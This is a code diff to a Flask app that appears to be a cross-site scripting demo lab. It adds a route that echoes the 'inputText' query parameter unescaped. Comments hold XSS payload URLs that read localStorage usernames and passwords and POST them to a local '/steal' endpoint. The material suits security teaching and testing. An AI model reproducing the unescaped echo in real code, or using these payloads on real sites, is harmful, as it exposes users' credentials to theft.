@@ -14,6 +14,23 @@ def index():
         return item
 
 
+@app.route("/reflected", methods=["POST", "GET"])
+def stored():
+    return render_template("reflected.html")
+
+
+# http://127.0.0.1:5000/submit?inputText=<script>console.log(localStorage.getItem("username2"), localStorage.getItem("password2"))</script>
+@app.route("/submit", methods=["POST", "GET"])
+def submit():
+    item = request.args.get("inputText", "default")
+
+    if request.method == "GET":
+        return item
+    if request.method == "POST":
+        user_input = request.form["inputText"]
+        return f"Text submitted: {user_input}"
+
+
 # http://127.0.0.1:5000/dom#2%22%20onerror=%22fetch('http://127.0.0.1:5000/steal',{method:'POST',headers:%20{'Accept':%20'application/json','Content-Type':%20'application/json'},body:JSON.stringify({username:localStorage.getItem('username'),password:localStorage.getItem('password')})}).then(e=%3Ee.json()).then(data=%3Ewindow.alert(JSON.stringify(data)))%22%3E
 @app.route("/steal", methods=["POST"])
 def steal():
